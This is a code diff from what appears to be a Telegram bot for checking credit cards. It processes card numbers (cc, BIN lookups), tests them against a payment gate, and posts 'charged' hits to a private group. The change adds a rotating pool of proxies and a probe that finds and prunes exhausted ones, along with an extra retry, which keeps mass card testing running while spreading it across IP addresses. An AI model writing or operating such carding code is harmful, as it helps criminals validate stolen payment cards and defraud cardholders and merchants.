@@ -14,6 +14,7 @@ from bin import get_bin_info
 from sub import get_premium_status
 from proxy_pool import get_user_proxies
 from proxy import parse_proxy_input
+from bms_proxy_pool import load_bms_proxies, prune_bms_proxy
 
 
 def _norm_proxy(proxy):
@@ -25,6 +26,17 @@ def _norm_proxy(proxy):
         pass
     return proxy
 from mass_gates._tg_helpers import safe_reply, send_hit, build_hit_card, EMOJI_RESPONSE, APPROVED_EMOJI as PX_LIVE, DECLINED_EMOJI as PX_DEAD
+
+
+def _proxy_bandwidth_dead(proxy):
+    """Quick liveness probe; True if the webshare proxy is bandwidth-burned."""
+    try:
+        p = _norm_proxy(proxy)
+        opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": p, "https": p}))
+        r = opener.open("http://api.ipify.org", timeout=12)
+        return "bandwidth" in r.read().decode("utf-8", "ignore").lower()
+    except Exception:
+        return False
 
 # silent group log for BMS hits (charged -> this group + pinned)
 BMS_GROUP_ID = -1004453592223
@@ -198,14 +210,20 @@ async def process_bms_check(message, proc_msg, user, user_id, formatted_cc, cc, 
     country_flag = bin_info.get("country_emoji", "")
     bin_country = f"{country_flag} {country_name}" if country_flag else country_name
 
-    user_proxies = await get_user_proxies(user_id)
+    user_proxies = load_bms_proxies() + await get_user_proxies(user_id)
     api_result = {"status": "error", "response": "ERROR", "real_response": "ERROR", "amount": "0.00"}
 
     if not user_proxies:
         api_result = {"status": "error", "response": "NO_PROXY", "real_response": "NO_PROXY", "amount": "0.00"}
     else:
-        for _attempt in range(3):
+        for _attempt in range(4):
             proxy = _norm_proxy(random.choice(user_proxies))
+            if _proxy_bandwidth_dead(proxy):
+                prune_bms_proxy(proxy)
+                user_proxies = [x for x in user_proxies if x != proxy]
+                if not user_proxies:
+                    break
+                continue
             try:
                 api_result = await asyncio.to_thread(_bms_api_check, formatted_cc, proxy)
             except Exception:
